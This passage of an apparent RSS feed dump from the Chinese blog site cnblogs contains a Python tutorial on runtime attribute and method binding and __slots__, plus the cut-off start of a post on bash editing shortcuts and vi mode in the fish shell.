-<og:description>上个月，学习群里的 S 同学问了个题目，大意可理解为列表降维 ，例子如下： 原始数据是一个二维列表，目的是获取该列表中所有元素的具体值。从抽象一点的角度来理解，也可看作是列表解压或者列表降维。 这个问</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/pythonista/p/10727060.html</dc:identifier>
-</item>
-<item>
-<title>python高级-动态特性(20) - Se7eN_HOU</title>
-<link>http://www.cnblogs.com/Se7eN-HOU/p/10726350.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/Se7eN-HOU/p/10726350.html</guid>
-<description>&lt;h3&gt;&lt;span&gt;一、动态语⾔的定义&lt;/span&gt;&lt;/h3&gt;
-&lt;p&gt;&lt;span&gt;动态语言是在运行时确定数据类型的语言。变量使用之前不需要类型声明，通常变量的类型是被赋值的那个值的类型。现在比较热门的动态语言有：Python、PHP、JavaScript、Objective-C等，而 C 、 C++ 等语言则不属于动态语言。&lt;/span&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;2-运行的过程中给对象绑定添加属性&quot;&gt;&lt;span&gt;二、运行的过程中给对象绑定(添加)属性&lt;/span&gt;&lt;/h3&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Person(object):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;(self,name=None,age=&lt;span&gt;None):
-        self.name&lt;/span&gt;=&lt;span&gt;name
-        self.age&lt;/span&gt;=&lt;span&gt;age
-
-p &lt;/span&gt;= Person(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;小明&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
-&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(p.name)
-&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(p.age)
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;&lt;span&gt;运行结果为：&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;span&gt;这里我们只定义了name和age两个属性，但是在类已经定义好了之后，我们仍然可以往里面添加属性，这就是动态语言的好处，动态的给实例绑定属性：&lt;/span&gt;&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Person(object):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;(self,name=None,age=&lt;span&gt;None):
-        self.name&lt;/span&gt;=&lt;span&gt;name
-        self.age&lt;/span&gt;=&lt;span&gt;age
-
-p &lt;/span&gt;= Person(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;小明&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
-&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(p.name)
-&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(p.age)
-
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;动态添加属性&lt;/span&gt;
-p.sex = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;男&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
-&lt;span&gt;print&lt;/span&gt;(p.sex)
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;&lt;span&gt;运行结果为：&lt;/span&gt;&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;小明
-24
-男&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;3-运行的过程中给类绑定添加属性&quot;&gt;&lt;span&gt;三、运行的过程中给类绑定(添加)属性&lt;/span&gt;&lt;/h3&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Person(object):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;(self,name=None,age=&lt;span&gt;None):
-        self.name&lt;/span&gt;=&lt;span&gt;name
-        self.age&lt;/span&gt;=&lt;span&gt;age
-
-
-P1 &lt;/span&gt;= Person(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;小明&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,24&lt;span&gt;)
-&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(P1.sex)
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;&lt;span&gt;运行结果为：&lt;/span&gt;&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;Traceback (most recent call last):
-  File &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;C:\Users\Se7eN_HOU\Desktop\test.py&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, line 8, &lt;span&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;
-    &lt;span&gt;print&lt;/span&gt;&lt;span&gt;(P1.sex)
-AttributeError: &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Person&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; object has no attribute &lt;span&gt;'&lt;/span&gt;&lt;span&gt;sex&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;&lt;span&gt;这是程序报错说，Person没有sex这个属性，我们可以通过给Person动态绑定属性，解决问题&lt;/span&gt;&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Person(object):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;(self,name=None,age=&lt;span&gt;None):
-        self.name&lt;/span&gt;=&lt;span&gt;name
-        self.age&lt;/span&gt;=&lt;span&gt;age
-
-
-P1 &lt;/span&gt;= Person(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;小明&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,24&lt;span&gt;)
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;动态给类添加属性&lt;/span&gt;
-Person.sex = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;男&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
-&lt;span&gt;print&lt;/span&gt;(P1.sex)
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;&lt;span&gt;这个时候在运行就不会出错，而且会打印出P1.sex为男&lt;/span&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;4-运行的过程中给类绑定添加方法&quot;&gt;&lt;span&gt;四、运行的过程中给类绑定(添加)方法&lt;/span&gt;&lt;/h3&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Person(object):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;(self,name=None,age=&lt;span&gt;None):
-        self.name&lt;/span&gt;=&lt;span&gt;name
-        self.age&lt;/span&gt;=&lt;span&gt;age
-
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; eat(self):
-        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;正在吃东西&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
-
-P1 &lt;/span&gt;= Person(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;小明&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,24&lt;span&gt;)
-P1.eat()
-P1.run()&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;&lt;span&gt;运行结果为：&lt;/span&gt;&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;正在吃东西
-Traceback (most recent call last):
-  File &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;C:\Users\Se7eN_HOU\Desktop\test.py&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, line 11, &lt;span&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;span&gt;
-
-    P1.run()
-AttributeError: &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Person&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; object has no attribute &lt;span&gt;'&lt;/span&gt;&lt;span&gt;run&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;&lt;span&gt;说明：正在吃东西打印出来了，说明eat函数被执行，但是后面报错说没有run这个属性，但是我想在类创建好了以后，在运行的时候动态的添加run方法怎么办呢？&lt;/span&gt;&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;#&lt;/span&gt;&lt;span&gt;动态添加方法需要导入types模块&lt;/span&gt;
-&lt;span&gt;import&lt;/span&gt;&lt;span&gt; types
-&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Person(object):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;(self,name=None,age=&lt;span&gt;None):
-        self.name&lt;/span&gt;=&lt;span&gt;name
-        self.age&lt;/span&gt;=&lt;span&gt;age
-
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; eat(self):
-        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;正在吃东西&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
-
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;定义好需要动态添加的方法&lt;/span&gt;
-&lt;span&gt;def&lt;/span&gt;&lt;span&gt; run(self):
-    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;在跑步&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
-    
-P1 &lt;/span&gt;= Person(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;小明&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,24&lt;span&gt;)
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;正常调用类里面的函数&lt;/span&gt;
-&lt;span&gt;P1.eat()
-
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;给对象动态绑定方法&lt;/span&gt;
-P1.run =&lt;span&gt; types.MethodType(run,P1)
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;对象调用动态绑定的方法&lt;/span&gt;
-P1.run()
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;&lt;span&gt;运行结果为：&lt;/span&gt;&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;正在吃东西
-在跑步&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;&lt;span&gt;打印出来“在跑步”说明run方法被正常执行了&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;动态绑定类方法和静态方法&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;#&lt;/span&gt;&lt;span&gt;动态添加方法需要导入types模块&lt;/span&gt;
-&lt;span&gt;import&lt;/span&gt;&lt;span&gt; types
-&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Person(object):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;(self,name=None,age=&lt;span&gt;None):
-        self.name&lt;/span&gt;=&lt;span&gt;name
-        self.age&lt;/span&gt;=&lt;span&gt;age
-
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; eat(self):
-        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;正在吃东西&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
-
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;定义好需要动态添加的实例方法&lt;/span&gt;
-&lt;span&gt;def&lt;/span&gt;&lt;span&gt; run(self):
-    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;在跑步&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
-
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;定义好需要动态添加的类方法&lt;/span&gt;
-&lt;span&gt;@classmethod
-&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; dynamicClassMethod(cls):
-    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;这是一个动态添加的类方法&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;定义好需要动态添加的静态方法&lt;/span&gt;
-&lt;span&gt;@staticmethod
-&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; dynamicStaticMethod():
-    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;这是一个动态添加的静态方法&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
-    
-P1 &lt;/span&gt;= Person(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;小明&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,24&lt;span&gt;)
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;正常调用类里面的函数&lt;/span&gt;
-&lt;span&gt;P1.eat()
-
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;给对象动态绑定方法&lt;/span&gt;&lt;span&gt;
-#&lt;/span&gt;&lt;span&gt;MethodType(参数1,参数2)&lt;/span&gt;&lt;span&gt;
-#&lt;/span&gt;&lt;span&gt;参数1：是动态绑定哪个方法，只写方法名即可&lt;/span&gt;&lt;span&gt;
-#&lt;/span&gt;&lt;span&gt;参数2：是把这个方法动态的绑定给谁&lt;/span&gt;
-P1.run =&lt;span&gt; types.MethodType(run,P1)
-P1.run()
-
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;动态绑定类方法的使用&lt;/span&gt;
-Person.dynamicClassMethod =&lt;span&gt; dynamicClassMethod
-Person.dynamicClassMethod()
-
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;动态绑定静态方法的使用&lt;/span&gt;
-Person.dynamicStaticMethod =&lt;span&gt; dynamicStaticMethod
-Person.dynamicStaticMethod()&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;总结：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ol&gt;&lt;li&gt;&lt;span&gt;给对象绑定属性直接在使用前进行赋值使用即可&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span&gt;给对象动态绑定方法需要import types模块&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span&gt;给对象动态绑定实例方法，需要使用type.MethodType（）方法&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span&gt;给类添加类方法和静态方法，也是直接在使用前赋值即可使用&lt;/span&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&quot;5-运行的过程中删除属性、方法&quot;&gt;&lt;span&gt;五、运行的过程中删除属性、方法&lt;/span&gt;&lt;/h3&gt;
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;删除的方法:&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ol&gt;&lt;li&gt;&lt;span&gt;del 对象.属性名&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span&gt;delattr(对象, &quot;属性名&quot;)&lt;/span&gt;&lt;/li&gt;
-&lt;/ol&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Person(object):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;(self,name=None,age=&lt;span&gt;None):
-        self.name&lt;/span&gt;=&lt;span&gt;name
-        self.age&lt;/span&gt;=&lt;span&gt;age
-
-P1 &lt;/span&gt;= Person(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;小明&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,24&lt;span&gt;)
-&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;---------删除前---------&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
-&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(P1.name)
-
-&lt;/span&gt;&lt;span&gt;del&lt;/span&gt;&lt;span&gt; P1.name
-
-&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;---------删除后---------&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
-&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(P1.name)
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;&lt;span&gt;运行结果为：&lt;/span&gt;&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
-&lt;pre&gt;
----------删除前---------&lt;span&gt;
-小明
-&lt;/span&gt;---------删除后---------
-&lt;span&gt;print&lt;/span&gt;(P1.name)AttributeError: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Person&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; object has no attribute &lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;slots&quot;&gt;&lt;span&gt;六、__slots__&lt;/span&gt;&lt;/h3&gt;
-&lt;p&gt;&lt;span class=&quot;pg-emphasize pg-emphasize-yellow&quot;&gt;动态语言：可以在运行的过程中，修改代码&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span class=&quot;pg-emphasize pg-emphasize-yellow&quot;&gt;静态语言：编译时已经确定好代码，运行过程中不能修改&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;如果我们想要限制实例的属性怎么办？比如，只允许对Person实例添加name和age属性。&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;为了达到限制的目的，Python允许在定义class的时候，定义一个特殊的__slots__变量，来限制该class实例能添加的属性：&lt;/span&gt;&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Person(object):
-    &lt;/span&gt;&lt;span&gt;__slots__&lt;/span&gt;=(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;age&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
-
-p &lt;/span&gt;=&lt;span&gt; Person()
-p.name &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;老王&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
-p.age &lt;/span&gt;= 40
-&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(p.name)
-&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(p.age)
-
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;slots之外的属性&lt;/span&gt;
-p.sex = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;男&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
-&lt;span&gt;print&lt;/span&gt;(p.sex)
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;&lt;span&gt;运行结果为：&lt;/span&gt;&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;老王
-&lt;/span&gt;40&lt;span&gt;
-    p.sex &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;男&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
-AttributeError: &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Person&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; object has no attribute &lt;span&gt;'&lt;/span&gt;&lt;span&gt;sex&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h4 id=&quot;注意&quot;&gt;&lt;span&gt;注意:&lt;/span&gt;&lt;/h4&gt;
-&lt;ul&gt;&lt;li&gt;&lt;span&gt;使用__slots__要注意，__slots__定义的属性仅对当前类实例起作用，对继承的子类是不起作用的&lt;/span&gt;&lt;/li&gt;
-&lt;/ul&gt;</description>
-<pubDate>Wed, 17 Apr 2019 15:35:00 +0000</pubDate>
-<dc:creator>Se7eN_HOU</dc:creator>
-<og:description>一、动态语⾔的定义 动态语言是在运行时确定数据类型的语言。变量使用之前不需要类型声明，通常变量的类型是被赋值的那个值的类型。现在比较热门的动态语言有：Python、PHP、JavaScript、Obj</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/Se7eN-HOU/p/10726350.html</dc:identifier>
-</item>
-<item>
-<title>命令行中的 vi 模式 - 刘哇勇</title>
-<link>http://www.cnblogs.com/Wayou/p/cli_vi_mode.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/Wayou/p/cli_vi_mode.html</guid>
-<description>&lt;p&gt;命令行中修改已经输入的命令比较麻烦，如果你不知道一些快捷键的话，只能使用方向键一个一个字符地移动到目标位置进行修改，对于比较复杂且过长的命令来说，效率不高。&lt;/p&gt;
-&lt;p&gt;以下信息来自 bash 的 man 页面：&lt;/p&gt;
-&lt;div class=&quot;highlight highlight-source-shell&quot; readability=&quot;11&quot;&gt;
-&lt;pre&gt;
-$ man bash
-&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;#&lt;/span&gt; ...&lt;/span&gt;
-
-   Commands &lt;span class=&quot;pl-k&quot;&gt;for&lt;/span&gt; Moving
-       beginning-of-line (C-a)
-              Move to the start of the current line.
-       end-of-line (C-e)
-              Move to the end of the line.
-       forward-char (C-f)
-              Move forward a character.
-       backward-char (C-b)
-              Move back a character.
-       forward-word (M-f)
-              Move  forward  to  the end of the next word.  Words are composed of alphanu-
-              meric characters (letters and digits).
-       backward-word (M-b)
-              Move back to the start of the current or previous word.  Words are  composed
-              of alphanumeric characters (letters and digits).
-       clear-screen (C-l)
-              Clear the screen leaving the current line at the top of the screen.  With an
-              argument, refresh the current line without clearing the screen.
-       redraw-current-line
-              Refresh the current line.
-
-&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;#&lt;/span&gt; ...&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;可看到 bash 本身提供了一些有用的快捷键可在命令中快速导航，&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;kbd&gt;control&lt;/kbd&gt; + &lt;kbd&gt;a&lt;/kbd&gt; 定位到行首（st&lt;strong&gt;a&lt;/strong&gt;rt）&lt;/li&gt;
-&lt;li&gt;&lt;kbd&gt;control&lt;/kbd&gt; + &lt;kbd&gt;e&lt;/kbd&gt; 定位到行末（&lt;strong&gt;e&lt;/strong&gt;nd）&lt;/li&gt;
-&lt;li&gt;&lt;kbd&gt;control&lt;/kbd&gt; + &lt;kbd&gt;f&lt;/kbd&gt; 向前移动一个单词（&lt;strong&gt;f&lt;/strong&gt;orward）&lt;/li&gt;
-&lt;li&gt;&lt;kbd&gt;control&lt;/kbd&gt; + &lt;kbd&gt;b&lt;/kbd&gt; 向后移动一个单词（&lt;strong&gt;b&lt;/strong&gt;ack）&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;移动光标，大部分情况下，我觉得记住这四个可以满足日常需求。&lt;/p&gt;
-&lt;p&gt;除了移动光标，还有一些编辑的快捷键，在 man 页面中 Killing and Yanking 部分，&lt;/p&gt;
-&lt;div class=&quot;highlight highlight-source-shell&quot; readability=&quot;16&quot;&gt;
-&lt;pre&gt;
-&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;#&lt;/span&gt; ...&lt;/span&gt;
-
-   Killing and Yanking
-       kill-line (C-k)
-              Kill the text from point to the end of the line.
-       backward-kill-line (C-x Rubout)
-              Kill backward to the beginning of the line.
-       unix-line-discard (C-u)
-              Kill  backward  from point to the beginning of the line.  The killed text is
-              saved on the kill-ring.
-       kill-whole-line
-              Kill all characters on the current line, no matter where point is.
-       kill-word (M-d)
-              Kill from point to the end of the current word, or &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; between words, to  the
-              end  of  the  next word.  Word boundaries are the same as those used by for-
-              ward-word.
-       backward-kill-word (M-Rubout)
-              Kill the word behind point.  Word boundaries are the same as those  used  by
-              backward-word.
-       unix-word-rubout (C-w)
-              Kill  the  word  behind  point,  using  white space as a word boundary.  The
-              killed text is saved on the kill-ring.
-       unix-filename-rubout
-              Kill the word behind point, using white space and the slash character as the
-              word boundaries.  The killed text is saved on the kill-ring.
-       delete-horizontal-space (M-&lt;span class=&quot;pl-cce&quot;&gt;\)&lt;/span&gt;
-              Delete all spaces and tabs around point.
-       kill-region
-              Kill the text &lt;span class=&quot;pl-k&quot;&gt;in&lt;/span&gt; the current region.
-       copy-region-as-kill
-              Copy the text &lt;span class=&quot;pl-k&quot;&gt;in&lt;/span&gt; the region to the &lt;span class=&quot;pl-c1&quot;&gt;kill&lt;/span&gt; buffer.
-       copy-backward-word
-              Copy  the word before point to the &lt;span class=&quot;pl-c1&quot;&gt;kill&lt;/span&gt; buffer.  The word boundaries are the
-              same as backward-word.
-       copy-forward-word
-              Copy the word following point to the &lt;span class=&quot;pl-c1&quot;&gt;kill&lt;/span&gt; buffer.  The word  boundaries  are
-              the same as forward-word.
-       yank (C-y)
-              Yank the top of the &lt;span class=&quot;pl-c1&quot;&gt;kill&lt;/span&gt; ring into the buffer at point.
-       yank-pop (M-y)
-              Rotate  the  &lt;span class=&quot;pl-c1&quot;&gt;kill&lt;/span&gt;  ring, and yank the new top.  Only works following yank or
-              yank-pop.
-
-&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;#&lt;/span&gt; ...&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;其中这一个我最常用：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;kbd&gt;control&lt;/kbd&gt; + &lt;kbd&gt;u&lt;/kbd&gt; 删除当前光标位置到行首的内容，配合着 &lt;kbd&gt;control&lt;/kbd&gt; + &lt;kbd&gt;e&lt;/kbd&gt; 把光标定位到行末再使用该命令，可实现清空整行的效果&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;除了这些快捷键，其实命令行还有个 vi 模式，该模式下的表现和在 vi 编辑器里一样，对于 vi 用户来说，进入这种模式后，编辑和修改命令就显得十分得心应手了。&lt;/p&gt;
-&lt;h2&gt;开启 vi 模式&lt;/h2&gt;
-&lt;p&gt;不同 shell 中开启的命令不一样，我比较偏好 &lt;a href=&quot;https://fishshell.com&quot; rel=&quot;nofollow&quot;&gt;fish&lt;/a&gt;，因为它的自动补全真的好用到无以复加。&lt;/p&gt;
-&lt;p&gt;运行 &lt;code&gt;fish_vi_key_bindings&lt;/code&gt; 即可进入 vi 模式。&lt;/p&gt;
-&lt;div class=&quot;highlight highlight-source-shell&quot;&gt;
-&lt;pre&gt;
-$ fish_vi_key_bindings
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;运行 &lt;code&gt;fish_default_key_bindings&lt;/code&gt; 回到默认。&lt;/p&gt;
-&lt;div class=&quot;highlight highlight-source-shell&quot; readability=&quot;7&quot;&gt;
